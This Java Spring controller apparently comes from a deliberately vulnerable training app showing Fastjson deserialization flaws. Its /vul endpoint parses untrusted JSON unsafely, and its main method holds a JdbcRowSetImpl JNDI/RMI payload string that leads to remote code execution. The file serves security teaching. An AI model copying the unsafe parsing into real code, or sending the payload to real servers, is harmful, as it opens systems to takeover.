package top.whgojp.modules.components.fastjson.controller;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import io.swagger.annotations.Api;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.*;
import top.whgojp.common.utils.R;

/**
 * @description 组件漏洞-Fastjson
 * @author: whgojp
 * @email: whgojp@foxmail.com
 * @Date: 2024/8/12 22:45
 */
@Slf4j
@Api(value = "FastjsonController", tags = "组件漏洞-Fastjson")
@Controller
@CrossOrigin(origins = "*")
@RequestMapping("/fastjson")
public class FastjsonController {
    @RequestMapping("")
    public String fastjson() {
        return "vul/components/fastjson";
    }

    @PostMapping("/vul")
    @ResponseBody
    public String vul(@RequestBody String content) {
        try {
            JSONObject jsonObject = JSON.parseObject(content);
            return jsonObject.toString();
        } catch (Exception e) {
            return e.getMessage();
        }
    }

    @PostMapping("/safe")
    @ResponseBody
    public String safe(@RequestBody String content) {
        try {
            // 1、禁用 AutoType
            ParserConfig.getGlobalInstance().setAutoTypeSupport(false);
            // 2、使用AutoType白名单机制
//            ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
//            ParserConfig.getGlobalInstance().addAccept("top.whgojp.WhiteListClass");
            // 3、1.2.68之后的版本，Fastjson真家里safeMode的支持
//            ParserConfig.getGlobalInstance().setSafeMode(true);
//            JSONObject jsonObject = JSON.parseObject(content, Feature.DisableSpecialKeyDetect);
            JSONObject jsonObject = JSON.parseObject(content);
            return jsonObject.toString();
        } catch (Exception e) {
            return e.getMessage();
        }
    }

    public static void main(String[] args) {
            // 启用全局 AutoType 支持
//            ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

            String jsonPayload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/DeserializationShell\",\"autoCommit\":true}";

            Object obj = com.alibaba.fastjson.JSON.parseObject(jsonPayload);
            System.out.println(obj);

    }

}
